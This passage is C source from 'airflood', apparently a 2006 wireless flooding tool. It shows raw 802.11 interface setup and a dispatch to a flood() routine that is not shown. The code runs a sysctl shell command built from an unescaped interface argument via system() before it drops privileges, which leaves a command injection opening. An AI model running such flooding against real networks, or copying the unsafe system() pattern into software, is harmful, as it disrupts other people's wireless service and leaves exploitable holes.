            memset( strbuf, 0, sizeof( strbuf ) );
            snprintf( strbuf,  sizeof( strbuf ) - 1,
                     "sysctl -w dev.%s.rawdev_type=1 &>/dev/null",
                     argv[optind] );
            system( strbuf );
#endif

            argv[optind] = athXraw;
        }
    }

    /* drop privileges */

    setuid( getuid() );

    if( opt.r_nbpps == 0 )
    {
        if( dev.is_wlanng || dev.is_hostap )
            opt.r_nbpps = 200;
        else
            opt.r_nbpps = 500;
    }

    /* open the replay interface */

    dev.is_madwifi = ( memcmp( argv[optind], "ath", 3 ) == 0 );

    if( openraw( argv[optind], dev.fd_out, &dev.arptype_out ) != 0 )
        return( 1 );

    /* open the packet source */

    if( opt.s_face != NULL )
    {
        dev.is_madwifi = ( memcmp( opt.s_face, "ath", 3 ) == 0 );

        if( openraw( opt.s_face, dev.fd_in, &dev.arptype_in ) != 0 )
            return( 1 );
    }
    else
    {
        dev.fd_in = dev.fd_out;
        dev.arptype_in = dev.arptype_out;
    }
/*
    if( opt.s_file != NULL )
    {
        if( ! ( dev.f_cap_in = fopen( opt.s_file, "rb" ) ) )
        {
            perror( "open failed" );
            return( 1 );
        }

        n = sizeof( struct pcap_file_header );

        if( fread( &dev.pfh_in, 1, n, dev.f_cap_in ) != (size_t) n )
        {
            perror( "fread(pcap file header) failed" );
            return( 1 );
        }

        if( dev.pfh_in.magic != TCPDUMP_MAGIC &&
            dev.pfh_in.magic != TCPDUMP_CIGAM )
        {
            fprintf( stderr, "\"%s\" isn't a pcap file (expected "
                             "TCPDUMP_MAGIC).\n", opt.s_file );
            return( 1 );
        }

        if( dev.pfh_in.magic == TCPDUMP_CIGAM )
            SWAP32(dev.pfh_in.linktype);

        if( dev.pfh_in.linktype != LINKTYPE_IEEE802_11 &&
            dev.pfh_in.linktype != LINKTYPE_PRISM_HEADER )
        {
            fprintf( stderr, "Wrong linktype from pcap file header "
                             "(expected LINKTYPE_IEEE802_11) -\n"
                             "this doesn't look like a regular 802.11 "
                             "capture.\n" );
            return( 1 );
        }
    }
*/
    fprintf(stderr, "airflood %i.%i - (C) 2006 nilp0inter2k6_at_gmail.com\n\n", VERSION, SUBVERSION);

    switch( opt.a_mode )
    {
        case 1 : case 2 : return( flood()   );
        default: break;
    }

    /* that's all, folks */

    return( 0 );
}
